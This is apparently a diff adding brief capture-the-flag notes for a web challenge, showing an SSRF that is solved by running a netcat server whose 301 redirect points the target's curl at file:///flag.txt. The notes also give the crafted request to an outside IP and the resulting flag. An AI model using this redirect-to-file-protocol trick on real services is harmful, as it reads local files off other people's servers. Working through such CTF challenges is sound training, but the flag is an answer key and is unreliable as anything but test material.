@@ -1,0 +1,10 @@
+only accept 'http://'
+
+http://localhost
+	Your IP address is 127.0.0.1. PRIVILEGED MODE ENABLED.
+My server:
+	echo -e "HTTP/1.1 301 Moved Permanently\r\nLocation:file:///flag.txt\r\n\r\n" | sudo nc -l 80
+http://localhost/?url=http://140.113.24.143/
+
+# Get flag
+BCTF{tricky_curl_redirect_to_file_protocol}
